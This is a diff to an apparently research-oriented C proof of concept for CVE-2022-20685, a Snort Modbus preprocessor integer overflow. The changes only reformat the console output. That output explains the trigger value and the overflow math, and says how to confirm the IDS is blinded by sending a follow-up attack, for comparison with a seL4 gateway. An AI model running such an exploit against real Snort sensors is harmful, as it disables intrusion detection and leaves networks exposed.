@@ -169,38 +169,28 @@ static void build_cve_20685_packet(uint8_t *packet, size_t *len) {
 
 static void print_packet_analysis(void) {
     printf("\n");
-    printf("┌────────────────────────────────────────────────────────────────┐\n");
-    printf("│  CVE-2022-20685: Integer Overflow Analysis                     │\n");
-    printf("├────────────────────────────────────────────────────────────────┤\n");
-    printf("│                                                                │\n");
-    printf("│  Vulnerable Code (modbus_decode.c):                            │\n");
-    printf("│                                                                │\n");
-    printf("│    uint16_t bytes_processed;                                   │\n");
-    printf("│    uint16_t record_length;                                     │\n");
-    printf("│    ...                                                         │\n");
-    printf("│    while (bytes_processed < tmp_count) {                       │\n");
-    printf("│        record_length = *(uint16_t*)(payload + offset);         │\n");
-    printf("│        bytes_processed = 7 + (2 * record_length);  // BUG!     │\n");
-    printf("│    }                                                           │\n");
-    printf("│                                                                │\n");
-    printf("├────────────────────────────────────────────────────────────────┤\n");
-    printf("│                                                                │\n");
-    printf("│  Attack: Set record_length = 0x%04X                           │\n", TRIGGER_RECORD_LENGTH);
-    printf("│                                                                │\n");
-    printf("│  Calculation:                                                  │\n");
-    printf("│    bytes_processed = 7 + (2 * 0x%04X)                         │\n", TRIGGER_RECORD_LENGTH);
-    printf("│                    = 7 + 0x1FFFC                               │\n");
-    printf("│                    = 0x20003                                   │\n");
-    printf("│                                                                │\n");
-    printf("│  Integer Overflow (uint16_t max = 0xFFFF):                     │\n");
-    printf("│    0x20003 & 0xFFFF = 0x0003                                   │\n");
-    printf("│                                                                │\n");
-    printf("│  Result:                                                       │\n");
-    printf("│    bytes_processed = 3                                         │\n");
-    printf("│    Loop condition (3 < tmp_count) remains TRUE                 │\n");
-    printf("│    → INFINITE LOOP → Snort hangs → IDS BLIND                  │\n");
-    printf("│                                                                │\n");
-    printf("└────────────────────────────────────────────────────────────────┘\n");
+    printf("┌──────────────────────────────────────┐\n");
+    printf("│ CVE-2022-20685: Integer Overflow     │\n");
+    printf("├──────────────────────────────────────┤\n");
+    printf("│ Vulnerable Code:                     │\n");
+    printf("│  uint16_t bytes_processed;           │\n");
+    printf("│  while (bytes_processed < tmp) {     │\n");
+    printf("│    bytes_processed =                 │\n");
+    printf("│      7 + (2 * record_length); //BUG  │\n");
+    printf("│  }                                   │\n");
+    printf("├──────────────────────────────────────┤\n");
+    printf("│ Attack: record_length = 0x%04X     │\n", TRIGGER_RECORD_LENGTH);
+    printf("│                                      │\n");
+    printf("│ Calculation:                         │\n");
+    printf("│  7 + (2 * 0x%04X) = 0x20003        │\n", TRIGGER_RECORD_LENGTH);
+    printf("│                                      │\n");
+    printf("│ Overflow (uint16_t max=0xFFFF):      │\n");
+    printf("│  0x20003 & 0xFFFF = 0x0003           │\n");
+    printf("│                                      │\n");
+    printf("│ Result: bytes_processed = 3          │\n");
+    printf("│  Loop always TRUE → INFINITE LOOP   │\n");
+    printf("│  → Snort hangs → IDS BLIND          │\n");
+    printf("└──────────────────────────────────────┘\n");
     printf("\n");
 }
 
@@ -218,11 +208,11 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
 
-    printf("╔════════════════════════════════════════════════════════════════╗\n");
-    printf("║  CVE-2022-20685: Snort Modbus Preprocessor Integer Overflow    ║\n");
-    printf("║  Affects: Snort < 2.9.19, Snort 3 < 3.1.11.0                   ║\n");
-    printf("║  Impact: IDS Denial of Service (Blindness)                     ║\n");
-    printf("╚════════════════════════════════════════════════════════════════╝\n");
+    printf("╔══════════════════════════════════════╗\n");
+    printf("║ CVE-2022-20685: Snort DoS           ║\n");
+    printf("║ Affects: Snort < 2.9.19             ║\n");
+    printf("║ Impact: IDS Denial of Service       ║\n");
+    printf("╚══════════════════════════════════════╝\n");
     printf("\n");
     printf("[*] Target: %s:%d\n", target_ip, target_port);
 
@@ -263,30 +253,25 @@ int main(int argc, char *argv[]) {
 
     printf("[3] Exploit delivered.\n\n");
 
-    printf("╔════════════════════════════════════════════════════════════════╗\n");
-    printf("║  RESULT                                                        ║\n");
-    printf("╠════════════════════════════════════════════════════════════════╣\n");
-    printf("║                                                                ║\n");
-    printf("║  If Snort is vulnerable (< 2.9.19):                            ║\n");
-    printf("║    • Modbus preprocessor is now stuck in infinite loop         ║\n");
-    printf("║    • Snort will NOT process any more packets                   ║\n");
-    printf("║    • IDS is effectively BLIND to all attacks                   ║\n");
-    printf("║                                                                ║\n");
-    printf("║  Verify by:                                                    ║\n");
-    printf("║    1. Check Snort CPU usage (should be 100%%)                   ║\n");
-    printf("║    2. Send CVE-2019-14462 attack - no alert generated          ║\n");
-    printf("║    3. Compare with seL4 gateway (still blocking attacks)       ║\n");
-    printf("║                                                                ║\n");
-    printf("╠════════════════════════════════════════════════════════════════╣\n");
-    printf("║  seL4 Gateway Comparison:                                      ║\n");
-    printf("║                                                                ║\n");
-    printf("║  seL4 is IMMUNE to this attack because:                        ║\n");
-    printf("║    • No Modbus preprocessor (no vulnerable code)               ║\n");
-    printf("║    • Simple length validation (can't be DoS'd)                 ║\n");
-    printf("║    • Protocol-break architecture (TCP terminated)              ║\n");
-    printf("║    • Minimal attack surface (~1000 LoC vs ~500k LoC)           ║\n");
-    printf("║                                                                ║\n");
-    printf("╚════════════════════════════════════════════════════════════════╝\n");
+    printf("╔══════════════════════════════════════╗\n");
+    printf("║ RESULT                               ║\n");
+    printf("╠══════════════════════════════════════╣\n");
+    printf("║ If Snort vulnerable (< 2.9.19):      ║\n");
+    printf("║  • Preprocessor in infinite loop    ║\n");
+    printf("║  • No more packets processed        ║\n");
+    printf("║  • IDS is BLIND to all attacks      ║\n");
+    printf("║                                      ║\n");
+    printf("║ Verify by:                           ║\n");
+    printf("║  1. Check CPU (should be 100%%)      ║\n");
+    printf("║  2. Send CVE-14462 - no alert       ║\n");
+    printf("║  3. Compare with seL4 (works)       ║\n");
+    printf("╠══════════════════════════════════════╣\n");
+    printf("║ seL4 is IMMUNE because:              ║\n");
+    printf("║  • No Modbus preprocessor           ║\n");
+    printf("║  • Simple length validation         ║\n");
+    printf("║  • Protocol-break architecture      ║\n");
+    printf("║  • ~1000 LoC vs ~500k LoC          ║\n");
+    printf("╚══════════════════════════════════════╝\n");
 
     close(sock);
     return EXIT_SUCCESS;
